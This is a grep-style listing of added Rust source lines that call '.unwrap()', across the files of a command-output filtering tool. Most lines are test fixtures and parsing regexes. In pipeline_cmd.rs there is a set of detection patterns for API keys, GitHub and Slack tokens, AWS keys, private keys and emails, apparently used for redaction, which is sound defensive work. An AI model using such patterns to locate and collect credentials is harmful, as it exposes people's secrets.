+src/cmds/system/find_cmd.rs:1308:        assert_eq!(hidden.last().unwrap(), "logs-old/f30.txt");
+src/cmds/system/find_cmd.rs:1357:        let p = parse_find_args(&args(&["/definitely/missing/xyz", "-maxdepth", "1"])).unwrap();
+src/cmds/system/find_cmd.rs:1360:        let p = parse_find_args(&args(&["./nope_xyz"])).unwrap();
+src/cmds/system/find_cmd.rs:1363:        match dispatch(&args(&["/definitely/missing/xyz", "-mtime", "+0"])).unwrap() {
+src/cmds/system/find_cmd.rs:1385:        .unwrap();
+src/cmds/system/find_cmd.rs:1516:            std::fs::write(tmp.path().join("a.txt"), "x").unwrap();
+src/cmds/system/find_cmd.rs:1519:                run("find", "*.txt", &root, 10, false, None, "f", false, 0).unwrap(),
+src/cmds/system/find_cmd.rs:1533:        let code = run_from_args(&args(&argv), 0).unwrap();
+src/cmds/system/find_cmd.rs:1549:        std::fs::write(root.join(".gitignore"), "secret.txt\nbuild/\n").unwrap();
+src/cmds/system/find_cmd.rs:1550:        std::fs::write(root.join("secret.txt"), "x").unwrap();
+src/cmds/system/find_cmd.rs:1551:        std::fs::write(root.join("visible.txt"), "y").unwrap();
+src/cmds/system/find_cmd.rs:1552:        std::fs::create_dir(root.join(".hidden")).unwrap();
+src/cmds/system/find_cmd.rs:1553:        std::fs::write(root.join(".hidden").join("h.txt"), "z").unwrap();
+src/cmds/system/find_cmd.rs:1554:        std::fs::create_dir(root.join("build")).unwrap();
+src/cmds/system/find_cmd.rs:1555:        std::fs::write(root.join("build").join("out.txt"), "w").unwrap();
+src/cmds/system/find_cmd.rs:1610:        std::fs::create_dir_all(root.join("sub").join(".hidden")).unwrap();
+src/cmds/system/find_cmd.rs:1611:        std::fs::write(root.join("sub").join("a.txt"), "a").unwrap();
+src/cmds/system/find_cmd.rs:1612:        std::fs::write(root.join("sub").join(".hidden").join("h.txt"), "h").unwrap();
+src/cmds/system/find_cmd.rs:1613:        std::os::unix::fs::symlink(root.join("sub"), root.join("link")).unwrap();
+src/cmds/system/find_cmd.rs:1623:        let h = filtered_hint(&["secret.txt".to_string(), ".hidden/h.txt".to_string()]).unwrap();
+src/cmds/system/format_cmd.rs:310:        let temp_dir = TempDir::new().unwrap();
+src/cmds/system/format_cmd.rs:312:        let mut file = fs::File::create(&pyproject_path).unwrap();
+src/cmds/system/format_cmd.rs:313:        writeln!(file, "[tool.black]\nline-length = 88").unwrap();
+src/cmds/system/format_cmd.rs:321:        let temp_dir = TempDir::new().unwrap();
+src/cmds/system/format_cmd.rs:323:        let mut file = fs::File::create(&pyproject_path).unwrap();
+src/cmds/system/format_cmd.rs:324:        writeln!(file, "[tool.ruff.format]\nindent-width = 4").unwrap();
+src/cmds/system/format_cmd.rs:332:        let temp_dir = TempDir::new().unwrap();
+src/cmds/system/format_cmd.rs:334:        let mut file = fs::File::create(&package_path).unwrap();
+src/cmds/system/format_cmd.rs:335:        writeln!(file, "{{\"name\": \"test\"}}").unwrap();
+src/cmds/system/json_cmd.rs:337:        let json: Value = serde_json::from_str(r#"{"name": "test", "count": 42}"#).unwrap();
+src/cmds/system/json_cmd.rs:346:        let json: Value = serde_json::from_str(r#"{"items": [1, 2, 3]}"#).unwrap();
+src/cmds/system/json_cmd.rs:381:        assert_eq!(output, filter_json_compact(&json[3..], 5).unwrap());
+src/cmds/system/json_cmd.rs:390:        assert_eq!(output, filter_json_string(&json[3..], 5).unwrap());
+src/cmds/system/local_llm.rs:142:    let re = Regex::new(pattern).unwrap();
+src/cmds/system/local_llm.rs:181:    let re = Regex::new(pattern).unwrap();
+src/cmds/system/local_llm.rs:210:    let re = Regex::new(pattern).unwrap();
+src/cmds/system/local_llm.rs:224:    let re = Regex::new(pattern).unwrap();
+src/cmds/system/log_cmd.rs:15:    Regex::new(r"^\d{4}[-/]\d{2}[-/]\d{2}[T ]\d{2}:\d{2}:\d{2}[.,]?\d*\s*").unwrap()
+src/cmds/system/log_cmd.rs:19:        .unwrap()
+src/cmds/system/log_cmd.rs:21:static HEX_RE: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"0x[0-9a-fA-F]+").unwrap());
+src/cmds/system/log_cmd.rs:22:static NUM_RE: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"\b\d{4,}\b").unwrap());
+src/cmds/system/log_cmd.rs:23:static PATH_RE: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"/[\w./\-]+").unwrap());
+src/cmds/system/ls.rs:21:    .unwrap()
+src/cmds/system/ls.rs:1116:            parse_ls_line("-rw-r--r--  1 user staff 1234 Jan  1 12:00 file.txt").unwrap();
+src/cmds/system/ls.rs:1127:                .unwrap();
+src/cmds/system/ls.rs:1138:                .unwrap();
+src/cmds/system/ls.rs:1148:            parse_ls_line("lrwxr-xr-x  1 user staff 10 Jan  1 12:00 link -> target").unwrap();
+src/cmds/system/ls.rs:1197:            parse_ls_line("-rw-r--r--  1 user staff 5678 Dec 25  2024 old.tar.gz").unwrap();
+src/cmds/system/read.rs:654:        let mut f1 = NamedTempFile::with_suffix(".txt").unwrap();
+src/cmds/system/read.rs:655:        let mut f2 = NamedTempFile::with_suffix(".txt").unwrap();
+src/cmds/system/read.rs:656:        writeln!(f1, "alpha\nbravo").unwrap();
+src/cmds/system/read.rs:657:        writeln!(f2, "charlie\ndelta").unwrap();
+src/cmds/system/read.rs:677:        let mut f1 = NamedTempFile::with_suffix(".txt").unwrap();
+src/cmds/system/read.rs:678:        writeln!(f1, "valid content").unwrap();
+src/cmds/system/search.rs:945:        LazyLock::new(|| Regex::new(r"^([^\x00]+)\x00(\d+)([:-])(.*)$").unwrap());
+src/cmds/system/search.rs:1352:        let header = lines.next().unwrap();
+src/cmds/system/search.rs:1353:        let prefix = header.strip_suffix(" (3 files)").unwrap();
+src/cmds/system/search.rs:2198:        let (file, line_num, is_match, content) = parse_match_line(line).unwrap();
+src/cmds/system/search.rs:2211:        let (file, line_num, is_match, content) = parse_match_line(line).unwrap();
+src/cmds/system/search.rs:2226:        let (file, line_num, is_match, content) = parse_match_line(line).unwrap();
+src/cmds/system/search.rs:2238:        let (file, line_num, is_match, content) = parse_match_line(line).unwrap();
+src/cmds/system/search.rs:2250:        let (file, line_num, is_match, content) = parse_match_line(line).unwrap();
+src/cmds/system/search.rs:2272:        let (file, line_num, is_match, content) = parse_match_line(line).unwrap();
+src/cmds/system/search.rs:2283:        let (file, line_num, is_match, content) = parse_match_line(line).unwrap();
+src/core/config.rs:854:                .unwrap()
+src/core/filter.rs:159:static MULTIPLE_BLANK_LINES: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"\n{3,}").unwrap());
+src/core/filter.rs:451:        assert_eq!(FilterLevel::from_str("none").unwrap(), FilterLevel::None);
+src/core/filter.rs:453:            FilterLevel::from_str("minimal").unwrap(),
+src/core/filter.rs:457:            FilterLevel::from_str("aggressive").unwrap(),
+src/core/pipeline_cmd.rs:315:        ("sk- API key", Regex::new(r"sk-[A-Za-z0-9]{20,}").unwrap()),
+src/core/pipeline_cmd.rs:318:            Regex::new(r"gh[pousr]_[A-Za-z0-9]{20,}").unwrap(),
+src/core/pipeline_cmd.rs:322:            Regex::new(r"github_pat_[A-Za-z0-9_]{20,}").unwrap(),
+src/core/pipeline_cmd.rs:324:        ("AWS access key", Regex::new(r"AKIA[0-9A-Z]{16}").unwrap()),
+src/core/pipeline_cmd.rs:327:            Regex::new(r"AIza[0-9A-Za-z_\-]{20,}").unwrap(),
+src/core/pipeline_cmd.rs:331:            Regex::new(r"xox[baprs]-[0-9A-Za-z-]{10,}").unwrap(),
+src/core/pipeline_cmd.rs:335:            Regex::new(r"-----BEGIN [A-Z ]*PRIVATE KEY-----").unwrap(),
+src/core/pipeline_cmd.rs:341:    LazyLock::new(|| Regex::new(r#"/(Users|home)/[^/\s"']+"#).unwrap());
+src/core/pipeline_cmd.rs:343:    LazyLock::new(|| Regex::new(r"[A-Za-z0-9._%+\-]+@[A-Za-z0-9.\-]+\.[A-Za-z]{2,}").unwrap());
+src/core/pipeline_remote.rs:997:        let s = parse_github_source("github:alice/rtk-pipeline-fast").unwrap();
+src/core/pipeline_remote.rs:1002:        let s = parse_github_source("github:alice/repo@abc123").unwrap();
+src/core/pipeline_remote.rs:1005:        let s = parse_github_source("https://github.com/alice/repo.git/").unwrap();
+src/core/pipeline_remote.rs:1106:        .unwrap();
+src/core/pipeline_remote.rs:1107:        let table: toml::Table = merged.parse().unwrap();
+src/core/pipeline_remote.rs:1108:        let pipeline = table["pipeline"].as_table().unwrap();
+src/core/pipeline_remote.rs:1112:            .unwrap()
+src/core/pipeline_remote.rs:1136:        .unwrap();
+src/core/pipeline_remote.rs:1147:        .unwrap();
+src/core/pipeline_remote.rs:1168:        let entry = table.get("demo").unwrap().as_table().unwrap();
+src/core/pipeline_remote.rs:1169:        assert_eq!(entry.get("source").unwrap().as_str(), Some("github:a/b"));
+src/core/pipeline_remote.rs:1170:        assert_eq!(entry.get("sha").unwrap().as_str(), Some("y"));
+src/core/pipeline_remote.rs:1172:            entry.get("published").unwrap().as_str(),
+src/core/retriever.rs:102:    if *bytes.last().unwrap() == b'\n' {
+src/core/retriever.rs:792:        let dir = tempfile::tempdir().unwrap();
+src/core/retriever.rs:794:        let stored = store_inner(&cfg, b"a\nb\nc\n", "vitest", Some(1), 1).unwrap();
+src/core/retriever.rs:795:        let conn = open(&cfg).unwrap();
+src/core/retriever.rs:798:        assert!(!stats_snapshot_with(&cfg).unwrap().is_empty());
+src/core/retriever.rs:801:        reset_stats_with(&cfg).unwrap();
+src/core/retriever.rs:803:            stats_snapshot_with(&cfg).unwrap().is_empty(),
+src/core/retriever.rs:807:        let conn = open(&cfg).unwrap();
+src/core/retriever.rs:809:        let stats = stats_snapshot_with(&cfg).unwrap();
+src/core/retriever.rs:819:        let dir = tempfile::tempdir().unwrap();
+src/core/retriever.rs:821:        let stored = store_inner(&cfg, b"a\nb\nc\n", "vitest", Some(1), 1).unwrap();
+src/core/retriever.rs:822:        reset_stats_with(&cfg).unwrap();
+src/core/retriever.rs:823:        let conn = open(&cfg).unwrap();
+src/core/retriever.rs:825:            load_by_hash(&conn, &stored.hash).unwrap().is_some(),
+src/core/retriever.rs:832:        let dir = tempfile::tempdir().unwrap();
+src/core/retriever.rs:834:        reset_stats_with(&cfg).unwrap();
+src/core/retriever.rs:835:        assert!(!cfg.database_path.as_ref().unwrap().exists());
+src/core/retriever.rs:909:        let dir = tempfile::tempdir().unwrap();
+src/core/retriever.rs:918:        let conn = open(&cfg).unwrap();
+src/core/retriever.rs:919:        let row = load_by_hash(&conn, &stored.hash).unwrap().expect("row");
+src/core/retriever.rs:921:            decode(&row).unwrap(),
+src/core/retriever.rs:929:        let dir = tempfile::tempdir().unwrap();
+src/core/retriever.rs:935:        let stored = store_inner(&cfg, &data, "c", Some(0), 1).unwrap();
+src/core/retriever.rs:936:        let conn = open(&cfg).unwrap();
+src/core/retriever.rs:937:        let row = load_by_hash(&conn, &stored.hash).unwrap().unwrap();
+src/core/retriever.rs:939:        assert_eq!(decode(&row).unwrap(), data);
+src/core/retriever.rs:944:        let dir = tempfile::tempdir().unwrap();
+src/core/retriever.rs:947:        let stored = store_inner(&cfg, content, "list", Some(0), 3).unwrap();
+src/core/retriever.rs:949:        let conn = open(&cfg).unwrap();
+src/core/retriever.rs:950:        let row = load_by_hash(&conn, &stored.hash).unwrap().unwrap();
+src/core/retriever.rs:951:        let full = decode(&row).unwrap();
+src/core/retriever.rs:957:        let dir = tempfile::tempdir().unwrap();
+src/core/retriever.rs:963:        let stored = store_inner(&cfg, &big, "big", Some(0), 1).unwrap();
+src/core/retriever.rs:964:        let conn = open(&cfg).unwrap();
+src/core/retriever.rs:965:        let row = load_by_hash(&conn, &stored.hash).unwrap().unwrap();
+src/core/retriever.rs:967:        assert_eq!(decode(&row).unwrap().len(), 10);
+src/core/retriever.rs:972:        let dir = tempfile::tempdir().unwrap();
+src/core/retriever.rs:980:        let stored = store_inner(&cfg, &content, "cmd", None, 5).unwrap();
+src/core/retriever.rs:981:        let conn = open(&cfg).unwrap();
+src/core/retriever.rs:982:        let row = load_by_hash(&conn, &stored.hash).unwrap().unwrap();
+src/core/retriever.rs:983:        let recallable = count_lines(slice_from_line(&decode(&row).unwrap(), row.shown_upto));
+src/core/retriever.rs:992:        let dir = tempfile::tempdir().unwrap();
+src/core/retriever.rs:1000:        let stored = store_inner(&cfg, &content, "cmd", None, 150).unwrap();
+src/core/retriever.rs:1005:        let conn = open(&cfg).unwrap();
+src/core/retriever.rs:1006:        let row = load_by_hash(&conn, &stored.hash).unwrap().unwrap();
+src/core/retriever.rs:1007:        let delta = slice_from_line(&decode(&row).unwrap(), row.shown_upto).to_vec();
+src/core/retriever.rs:1022:        let dir = tempfile::tempdir().unwrap();
+src/core/retriever.rs:1030:        let stored = store_inner(&cfg, &content, "cmd", None, 20).unwrap();
+src/core/retriever.rs:1031:        let conn = open(&cfg).unwrap();
+src/core/retriever.rs:1038:            .unwrap();
+src/core/retriever.rs:1048:        let dir = tempfile::tempdir().unwrap();
+src/core/retriever.rs:1056:        let stored = store_inner(&cfg, &content, "cmd", None, 50).unwrap();
+src/core/retriever.rs:1061:        let conn = open(&cfg).unwrap();
+src/core/retriever.rs:1062:        let row = load_by_hash(&conn, &stored.hash).unwrap().unwrap();
+src/core/retriever.rs:1063:        let delta = slice_from_line(&decode(&row).unwrap(), row.shown_upto).to_vec();
+src/core/retriever.rs:1069:        let dir = tempfile::tempdir().unwrap();
+src/core/retriever.rs:1074:        let stored = store_inner(&cfg, b"aaaa\nbbbb\ncccc\n", "cmd", Some(0), 1).unwrap();
+src/core/retriever.rs:1075:        let conn = open(&cfg).unwrap();
+src/core/retriever.rs:1076:        let row = load_by_hash(&conn, &stored.hash).unwrap().unwrap();
+src/core/retriever.rs:1078:        assert_eq!(decode(&row).unwrap(), b"aaaa\nbbbb\n");
+src/core/retriever.rs:1083:        let dir = tempfile::tempdir().unwrap();
+src/core/retriever.rs:1089:        let stored = store_inner(&cfg, &big, "big", Some(0), 1).unwrap();
+src/core/retriever.rs:1090:        let conn = open(&cfg).unwrap();
+src/core/retriever.rs:1091:        let row = load_by_hash(&conn, &stored.hash).unwrap().unwrap();
+src/core/retriever.rs:1093:        assert_eq!(decode(&row).unwrap().len(), 10);
+src/core/retriever.rs:1098:        let dir = tempfile::tempdir().unwrap();
+src/core/retriever.rs:1111:        let dir = tempfile::tempdir().unwrap();
+src/core/retriever.rs:1118:            store_inner(&cfg, format!("o{i}\n").as_bytes(), "cmd", Some(1), 1).unwrap();
+src/core/retriever.rs:1122:        let conn = open(&cfg).unwrap();
+src/core/retriever.rs:1124:            load_by_hash(&conn, &stored.hash).unwrap().is_some(),
+src/core/retriever.rs:1131:        let dir = tempfile::tempdir().unwrap();
+src/core/retriever.rs:1137:        let old = store_inner(&cfg, b"first\n", "cmd", Some(1), 1).unwrap();
+src/core/retriever.rs:1139:            store_inner(&cfg, format!("mid{i}\n").as_bytes(), "cmd", Some(1), 1).unwrap();
+src/core/retriever.rs:1141:        let conn = open(&cfg).unwrap();
+src/core/retriever.rs:1146:        .unwrap();
+src/core/retriever.rs:1151:        .unwrap();
+src/core/retriever.rs:1153:        store_inner(&cfg, b"newest\n", "cmd", Some(1), 1).unwrap();
+src/core/retriever.rs:1154:        let conn = open(&cfg).unwrap();
+src/core/retriever.rs:1156:            load_by_hash(&conn, &old.hash).unwrap().is_some(),
+src/core/retriever.rs:1163:        let dir = tempfile::tempdir().unwrap();
+src/core/retriever.rs:1169:        let conn = open(&cfg).unwrap();
+src/core/retriever.rs:1180:            .unwrap();
+src/core/retriever.rs:1189:        let dir = tempfile::tempdir().unwrap();
+src/core/retriever.rs:1197:            store_inner(&cfg, content.as_bytes(), &format!("cmd{i}"), Some(0), 1).unwrap();
+src/core/retriever.rs:1199:        let conn = open(&cfg).unwrap();
+src/core/retriever.rs:1202:            .unwrap();
+src/core/retriever.rs:1208:        let dir = tempfile::tempdir().unwrap();
+src/core/retriever.rs:1210:        let a = store_inner(&cfg, b"same output\n", "cmd", Some(0), 1).unwrap();
+src/core/retriever.rs:1211:        let b = store_inner(&cfg, b"same output\n", "cmd", Some(0), 1).unwrap();
+src/core/retriever.rs:1213:        let conn = open(&cfg).unwrap();
+src/core/retriever.rs:1216:            .unwrap();
+src/core/retriever.rs:1222:        let dir = tempfile::tempdir().unwrap();
+src/core/retriever.rs:1224:        store_inner(&cfg, b"out1\n", "cargo-test", Some(1), 1).unwrap();
+src/core/retriever.rs:1225:        store_inner(&cfg, b"out2\n", "cargo-test", Some(1), 1).unwrap();
+src/core/retriever.rs:1226:        let stats = stats_snapshot_with(&cfg).unwrap();
+src/core/retriever.rs:1237:        let dir = tempfile::tempdir().unwrap();
+src/core/retriever.rs:1239:        let conn = open(&cfg).unwrap();
+src/core/retriever.rs:1243:        let stats = stats_snapshot_with(&cfg).unwrap();
+src/core/retriever.rs:1258:        let dir = tempfile::tempdir().unwrap();
+src/core/retriever.rs:1260:        let stored = store_inner(&cfg, b"x\ny\n", "vitest", Some(1), 1).unwrap();
+src/core/retriever.rs:1261:        let conn = open(&cfg).unwrap();
+src/core/retriever.rs:1265:        let stats = stats_snapshot_with(&cfg).unwrap();
+src/core/retriever.rs:1279:        let dir = tempfile::tempdir().unwrap();
+src/core/retriever.rs:1298:        let dir = tempfile::tempdir().unwrap();
+src/core/retriever.rs:1300:        let conn = open(&cfg).unwrap();
+src/core/retriever.rs:1304:        let stats = stats_snapshot_with(&cfg).unwrap();
+src/core/retriever.rs:1314:        let dir = tempfile::tempdir().unwrap();
+src/core/retriever.rs:1316:        let stored = store_inner(&cfg, b"trimmed list\n", "docker-images", None, 2).unwrap();
+src/core/retriever.rs:1317:        let conn = open(&cfg).unwrap();
+src/core/retriever.rs:1324:            .unwrap();
+src/core/retriever.rs:1333:        let dir = tempfile::tempdir().unwrap();
+src/core/retriever.rs:1335:        let stored = store_inner(&cfg, b"same fail\n", "cargo_test", Some(1), 1).unwrap();
+src/core/retriever.rs:1336:        let conn = open(&cfg).unwrap();
+src/core/retriever.rs:1338:        store_inner(&cfg, b"same fail\n", "cargo_test", Some(1), 1).unwrap();
+src/core/retriever.rs:1340:        let stats = stats_snapshot_with(&cfg).unwrap();
+src/core/retriever.rs:1353:        let dir = tempfile::tempdir().unwrap();
+src/core/retriever.rs:1355:        let stored = store_inner(&cfg, b"a\nb\nc\n", "gh-prs", Some(0), 2).unwrap();
+src/core/retriever.rs:1356:        let conn = open(&cfg).unwrap();
+src/core/retriever.rs:1357:        let row = load_by_hash(&conn, &stored.hash).unwrap().unwrap();
+src/core/retriever.rs:1359:        let stats = stats_snapshot_with(&cfg).unwrap();
+src/core/retriever.rs:1369:        let dir = tempfile::tempdir().unwrap();
+src/core/retriever.rs:1376:            store_inner(&cfg, format!("o{i}\n").as_bytes(), "find", Some(1), 1).unwrap();
+src/core/retriever.rs:1378:        let conn = open(&cfg).unwrap();
+src/core/retriever.rs:1381:            .unwrap();
+src/core/retriever.rs:1383:        let stats = stats_snapshot_with(&cfg).unwrap();
+src/core/retriever.rs:1393:        let dir = tempfile::tempdir().unwrap();
+src/core/retriever.rs:1395:        let path = db_path(&cfg).unwrap();
+src/core/retriever.rs:1396:        std::fs::create_dir_all(path.parent().unwrap()).unwrap();
+src/core/retriever.rs:1397:        let conn = Connection::open(&path).unwrap();
+src/core/retriever.rs:1407:        .unwrap();
+src/core/retriever.rs:1412:        let conn = open(&cfg).unwrap();
+src/core/retriever.rs:1414:        let stats = stats_snapshot_with(&cfg).unwrap();
+src/core/retriever.rs:1444:        let dir = tempfile::tempdir().unwrap();
+src/core/retriever.rs:1446:        let conn = open(&cfg).unwrap();
+src/core/retriever.rs:1451:        let stats = stats_snapshot_with(&cfg).unwrap();
+src/core/retriever.rs:1474:        let dir = tempfile::tempdir().unwrap();
+src/core/retriever.rs:1476:        let conn = open(&cfg).unwrap();
+src/core/retriever.rs:1480:        let stats = stats_snapshot_with(&cfg).unwrap();
+src/core/retriever.rs:1495:        .unwrap();
+src/core/retriever.rs:1500:        let dir = tempfile::tempdir().unwrap();
+src/core/retriever.rs:1502:        let conn = open(&cfg).unwrap();
+src/core/retriever.rs:1513:        let dir = tempfile::tempdir().unwrap();
+src/core/retriever.rs:1515:        let conn = open(&cfg).unwrap();
+src/core/retriever.rs:1518:        assert!(load_by_hash(&conn, "aaa").unwrap().is_some());
+src/core/retriever.rs:1519:        assert!(load_by_hash(&conn, "aaa111111111").unwrap().is_some());
+src/core/retriever.rs:1520:        assert!(load_by_hash(&conn, "ccc").unwrap().is_none());
+src/core/retriever.rs:1525:        let dir = tempfile::tempdir().unwrap();
+src/core/retriever.rs:1527:        let stored = store_inner(&cfg, b"hello world\n", "cmd", Some(0), 1).unwrap();
+src/core/retriever.rs:1528:        let conn = open(&cfg).unwrap();
+src/core/retriever.rs:1530:        assert!(load_by_hash(&conn, prefix).unwrap().is_some());
+src/core/runner.rs:729:        Regex::new(r"(?i)^.*error[\s:\[].*$").unwrap(),
+src/core/runner.rs:730:        Regex::new(r"(?i)^.*\berr\b.*$").unwrap(),
+src/core/runner.rs:731:        Regex::new(r"(?i)^.*warning[\s:\[].*$").unwrap(),
+src/core/runner.rs:732:        Regex::new(r"(?i)^.*\bwarn\b.*$").unwrap(),
+src/core/runner.rs:733:        Regex::new(r"(?i)^.*failed.*$").unwrap(),
+src/core/runner.rs:734:        Regex::new(r"(?i)^.*failure.*$").unwrap(),
+src/core/runner.rs:735:        Regex::new(r"(?i)^.*exception.*$").unwrap(),
+src/core/runner.rs:736:        Regex::new(r"(?i)^.*panic.*$").unwrap(),
+src/core/runner.rs:738:        Regex::new(r"^error\[E\d+\]:.*$").unwrap(),
+src/core/runner.rs:739:        Regex::new(r"^\s*--> .*:\d+:\d+$").unwrap(),
+src/core/runner.rs:741:        Regex::new(r"^Traceback.*$").unwrap(),
+src/core/runner.rs:742:        Regex::new(r#"^\s*File ".*", line \d+.*$"#).unwrap(),
+src/core/runner.rs:744:        Regex::new(r"^\s*at .*:\d+:\d+.*$").unwrap(),
+src/core/runner.rs:746:        Regex::new(r"^.*\.go:\d+:.*$").unwrap(),
+src/core/runner.rs:1127:static DENO_TS_ERROR: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"^TS\d+ \[ERROR\]:").unwrap());
+src/core/runner.rs:1141:static BUN_RAN_FOOTER: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"^Ran \d+ test").unwrap());
+src/core/runner.rs:1147:    LazyLock::new(|| Regex::new(r"^(?:\(fail\)|✗)\s.*\[[\d.]+(?:µ|m)?s\]$").unwrap());
+src/core/runner.rs:1153:    LazyLock::new(|| Regex::new(r"^\S.* => \S+:\d+:\d+$").unwrap());
+src/core/stream.rs:902:        let status = Command::new("true").status().unwrap();
+src/core/stream.rs:908:        let status = Command::new("false").status().unwrap();
+src/core/stream.rs:915:        let mut child = Command::new("sleep").arg("60").spawn().unwrap();
+src/core/stream.rs:916:        child.kill().unwrap();
+src/core/stream.rs:917:        let status = child.wait().unwrap();
+src/core/stream.rs:1006:        let result = run_streaming(&mut cmd, StdinMode::Null, FilterMode::Passthrough).unwrap();
+src/core/stream.rs:1017:        let result = run_streaming(&mut cmd, StdinMode::Null, FilterMode::Passthrough).unwrap();
+src/core/stream.rs:1024:        let result = run_streaming(&mut cmd, StdinMode::Null, FilterMode::Passthrough).unwrap();
+src/core/stream.rs:1032:        let result = run_streaming(&mut cmd, StdinMode::Null, FilterMode::Passthrough).unwrap();
+src/core/stream.rs:1054:        .unwrap();
+src/core/stream.rs:1071:        .unwrap();
+src/core/stream.rs:1086:        let result = run_streaming(&mut cmd, StdinMode::Null, FilterMode::CaptureOnly).unwrap();
+src/core/stream.rs:1107:        let result = run_streaming(&mut cmd, StdinMode::Null, FilterMode::CaptureOnly).unwrap();
+src/core/stream.rs:1121:        assert_eq!(result.unwrap().exit_code, 0);
+src/core/stream.rs:1127:        let result = run_streaming(&mut cmd, StdinMode::Null, FilterMode::Passthrough).unwrap();
+src/core/stream.rs:1135:        let result = run_streaming(&mut cmd, StdinMode::Null, FilterMode::CaptureOnly).unwrap();
+src/core/stream.rs:1143:        let result = run_streaming(&mut cmd, StdinMode::Null, FilterMode::CaptureOnly).unwrap();
+src/core/stream.rs:1151:        let result = exec_capture(&mut cmd).unwrap();
+src/core/stream.rs:1160:        let result = exec_capture(&mut cmd).unwrap();
+src/core/stream.rs:1170:        let result = exec_capture(&mut cmd).unwrap();
+src/core/stream.rs:1179:        let result = exec_capture(&mut cmd).unwrap();
+src/core/stream.rs:1380:        .unwrap();
+src/core/tee.rs:305:        let dir = tempfile::tempdir().unwrap();
+src/core/tee.rs:321:        let dir = tempfile::tempdir().unwrap();
+src/core/tee_file.rs:319:        let tmpdir = tempfile::tempdir().unwrap();
+src/core/tee_file.rs:324:        let written = fs::read_to_string(&path).unwrap();
+src/core/tee_file.rs:333:        let tmpdir = tempfile::tempdir().unwrap();
+src/core/tee_file.rs:338:        let mode = |p: &std::path::Path| fs::metadata(p).unwrap().permissions().mode() & 0o777;
+src/core/tee_file.rs:351:        let tmpdir = tempfile::tempdir().unwrap();
+src/core/tee_file.rs:358:        let mode = fs::metadata(&path).unwrap().permissions().mode() & 0o777;
+src/core/tee_file.rs:364:        let tmpdir = tempfile::tempdir().unwrap();
+src/core/tee_file.rs:368:        let content = fs::read_to_string(&path).unwrap();
+src/core/tee_file.rs:375:        let tmpdir = tempfile::tempdir().unwrap();
+src/core/tee_file.rs:380:        let content = fs::read_to_string(&path).unwrap();
+src/core/tee_file.rs:387:        let tmpdir = tempfile::tempdir().unwrap();
+src/core/tee_file.rs:391:            fs::write(dir.join(&filename), "content").unwrap();
+src/core/tee_file.rs:394:        let remaining: Vec<_> = fs::read_dir(dir).unwrap().filter_map(|e| e.ok()).collect();
+src/core/tee_file.rs:404:        let tmpdir = tempfile::tempdir().unwrap();
+src/core/tee_file.rs:405:        fs::write(tmpdir.path().join("1755590000_cargo_test.log"), "x").unwrap();
+src/core/tee_file.rs:411:        let tmpdir = tempfile::tempdir().unwrap();
+src/core/tee_file.rs:412:        fs::write(tmpdir.path().join("1_old.log"), "x").unwrap();
+src/core/tee_file.rs:419:        let tmpdir = tempfile::tempdir().unwrap();
+src/core/tee_file.rs:420:        fs::write(tmpdir.path().join("notes.txt"), "x").unwrap();
+src/core/telemetry.rs:589:        let names: Vec<&str> = arr.iter().map(|e| e["filter"].as_str().unwrap()).collect();
+src/core/telemetry.rs:604:        let arr = v.as_array().unwrap();
+src/core/telemetry.rs:606:        let sqlite = arr.iter().find(|e| e["mode"] == "sqlite").unwrap();
+src/core/telemetry.rs:607:        let tee = arr.iter().find(|e| e["mode"] == "tee").unwrap();
+src/core/telemetry.rs:618:        let obj = v.as_array().unwrap()[0].as_object().unwrap();
+src/core/toml_filter.rs:1411:        assert!(!result.unwrap().is_empty());
+src/core/toml_filter.rs:1426:        assert_eq!(found.unwrap().name, "terraform-plan");
+src/core/toml_filter.rs:2317:        assert_eq!(found.unwrap().name, "my-new-tool");
+src/core/tracking.rs:25://! let tracker = Tracker::new().unwrap();
+src/core/tracking.rs:26://! let summary = tracker.get_summary().unwrap();
+src/core/tracking.rs:579:    LazyLock::new(|| regex::Regex::new(r"^[a-z][A-Za-z0-9:_-]*$").unwrap());
+src/core/tracking.rs:3036:        assert_eq!(exact.unwrap(), "/home/user/project");
+src/core/tracking.rs:3038:        let glob_val = glob.unwrap();
+src/core/tracking.rs:3060:        assert_eq!(exact.unwrap(), "/home/user/my_project");
+src/core/tracking.rs:3061:        let glob_val = glob.unwrap();
+src/core/tracking.rs:3098:            .unwrap();
+src/core/tracking.rs:3101:            .unwrap();
+src/core/tracking.rs:3104:            .unwrap();
+src/core/tracking.rs:3106:        let summary = tracker.get_parse_failure_summary().unwrap();
+src/core/utils.rs:925:        let v: Value = from_json_str("\u{feff}{\"foo\": 1}").unwrap();
+src/core/utils.rs:931:        let v: Value = from_json_str("{\"foo\": 1}").unwrap();
+src/core/utils.rs:943:        let b: Borrowed = from_json_str("\u{feff}{\"name\": \"rtk\"}").unwrap();
+src/core/utils.rs:1340:                std::env::current_dir().unwrap(),
+src/core/utils.rs:1349:            let path = result.unwrap();
+src/core/utils.rs:1373:                std::env::current_dir().unwrap(),
+src/core/utils.rs:1393:                std::env::current_dir().unwrap(),
+src/core/utils.rs:1403:            let output = output.unwrap();
+src/core/utils.rs:1423:                result.is_err() || !result.unwrap().status.success(),
+src/core/utils.rs:1437:                std::env::current_dir().unwrap(),
+src/core/utils.rs:1528:        fs::metadata(path).unwrap().permissions().mode() & 0o777
+src/core/utils.rs:1534:        let tmp = tempfile::tempdir().unwrap();
+src/core/utils.rs:1536:        create_private_dir(&nested).unwrap();
+src/core/utils.rs:1543:        let tmp = tempfile::tempdir().unwrap();
+src/core/utils.rs:1545:        fs::create_dir_all(&dir).unwrap();
+src/core/utils.rs:1548:        create_private_dir(&dir).unwrap();
+src/core/utils.rs:1554:        let tmp = tempfile::tempdir().unwrap();
+src/core/utils.rs:1556:        create_private_dir(&dir).unwrap();
+src/core/utils.rs:1564:        let tmp = tempfile::tempdir().unwrap();
+src/core/utils.rs:1566:        fs::write(&file, b"x").unwrap();
+src/core/utils.rs:1575:        let tmp = tempfile::tempdir().unwrap();
+src/core/utils.rs:1750:        let tmp = tempfile::tempdir().unwrap();
+src/core/utils.rs:1752:        create_private_dir(&dir).unwrap();
+src/core/utils.rs:1756:        create_private_dir(&dir).unwrap();
+src/core/utils.rs:1763:        let tmp = tempfile::tempdir().unwrap();
+src/core/utils.rs:1765:        fs::write(&file, b"x").unwrap();
+src/discover/lexer.rs:1472:            .unwrap();
